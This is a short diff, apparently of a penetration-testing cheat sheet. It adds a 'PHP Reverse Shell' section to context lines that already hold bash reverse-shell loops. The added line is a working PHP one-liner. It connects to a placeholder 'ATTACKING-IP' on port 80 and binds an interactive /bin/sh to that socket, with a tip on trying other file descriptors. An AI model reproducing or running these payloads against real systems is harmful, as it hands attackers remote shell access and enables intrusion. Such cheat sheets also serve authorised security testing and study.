@@ -18,9 +18,12 @@ cat <&5 | while read line; do $line 2>&5 >&5; done
 while read line 0<&5; do $line 2>&5 >&5; done
 ```
 
-#
+# PHP Reverse Shell
 
-```
+```php
+
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 ```
 
 #
